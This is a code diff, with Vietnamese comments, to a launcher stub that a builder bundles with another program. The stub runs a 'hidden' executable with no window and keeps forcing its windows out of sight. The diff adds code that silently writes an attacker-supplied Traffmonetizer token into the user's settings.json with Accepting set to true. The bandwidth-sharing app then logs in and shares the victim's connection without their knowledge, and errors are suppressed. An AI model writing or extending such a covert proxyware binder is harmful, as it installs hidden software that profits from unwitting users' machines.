@@ -8,12 +8,16 @@ Nhiem vu:
   1. Chay app AN   : khong cua so (SW_HIDE + CREATE_NO_WINDOW),
                      kem watcher lien tuc ep an moi cua so no tao ra.
   2. Chay app HIEN : binh thuong (bo qua neu build o che do SOLO).
-  3. Don dep       : khi app chinh dong -> kill tien trinh an (neu cau hinh).
+  3. Auto-token    : (tuy chon) tu ghi Token vao settings.json cua
+                     Traffmonetizer (%APPDATA%\\traffmonetizer\\settings.json)
+                     de app tu dang nhap + tu ket noi khi khoi dong.
+  4. Don dep       : khi app chinh dong -> kill tien trinh an (neu cau hinh).
 
 Cac token %%...%% se duoc builder thay bang gia tri that truoc khi build.
 """
 
 import atexit
+import json
 import os
 import subprocess
 import sys
@@ -27,6 +31,11 @@ HIDDEN_NAME = "%%HIDDEN_NAME%%"
 VISIBLE_NAME = "%%VISIBLE_NAME%%"  # rong = che do SOLO (chi chay app an)
 KILL_HIDDEN_ON_VISIBLE_EXIT = %%KILL_HIDDEN%%
 ENABLE_HIDE_WATCHER = %%HIDE_WATCH%%
+
+# --- Auto-token Traffmonetizer ---
+TM_PRESEED = %%TM_PRESEED%%          # True neu file an la Traffmonetizer + co token
+TM_TOKEN = "%%TM_TOKEN%%"            # application token (da bi builder che mot phan trong log)
+TM_START_WITH_WINDOWS = %%TM_AUTORUN%%  # false de tranh registry Run tro vao thu muc TEMP
 
 
 def _resource_base():
@@ -59,8 +68,51 @@ def _fatal(message):
         pass
 
 
+def _preseed_traffmonetizer():
+    """Ghi Token vao %APPDATA%\\traffmonetizer\\settings.json TRUOC khi chay app.
+
+    Cau truc settings.json duoc xac dinh bang cach phan tich truc tiep binary
+    Traffmonetizer (DataContractJsonSerializer, cac DataMember: Token,
+    Accepting, StartWithWindows - giu nguyen ten property, PascalCase).
+    App doc file nay luc khoi dong: co Token -> bo qua man hinh login,
+    Accepting = True -> tu dong chap nhan chia se traffic (tu ket noi).
+    """
+    if not TM_PRESEED or not TM_TOKEN:
+        return
+    try:
+        appdata = os.environ.get("APPDATA")
+        if not appdata:
+            return
+        settings_dir = os.path.join(appdata, "traffmonetizer")
+        os.makedirs(settings_dir, exist_ok=True)
+        settings_path = os.path.join(settings_dir, "settings.json")
+
+        data = {}
+        if os.path.isfile(settings_path):
+            try:
+                with open(settings_path, "r", encoding="utf-8-sig") as f:
+                    loaded = json.load(f)
+                if isinstance(loaded, dict):
+                    data = loaded
+            except Exception:
+                data = {}
+
+        data["Token"] = TM_TOKEN
+        data["Accepting"] = True
+        data["StartWithWindows"] = bool(TM_START_WITH_WINDOWS)
+
+        with open(settings_path, "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False)
+    except Exception:
+        # Khong bao loi lam dung luong chinh - app van chay, chi la khong auto-login
+        pass
+
+
 def _launch_hidden(path):
-    """Khoi dong app an: khong cua so, khong console."""
+    """Khoi dong app an: khong cua so, khong console.
+
+    Khong truyen /show -> app Traffmonetizer khoi dong yen lang (khong mo cua so).
+    """
     kwargs = {"cwd": _launch_cwd()}
     if IS_WINDOWS:
         si = subprocess.STARTUPINFO()
@@ -145,6 +197,9 @@ def _start_hide_watcher(proc):
 
 
 def main():
+    # 0. Auto-token: ghi Token vao settings.json truoc khi app khoi dong
+    _preseed_traffmonetizer()
+
     # --- App an (bat buoc) ---
     hidden_path = _exe_path(HIDDEN_NAME)
     if not os.path.isfile(hidden_path):
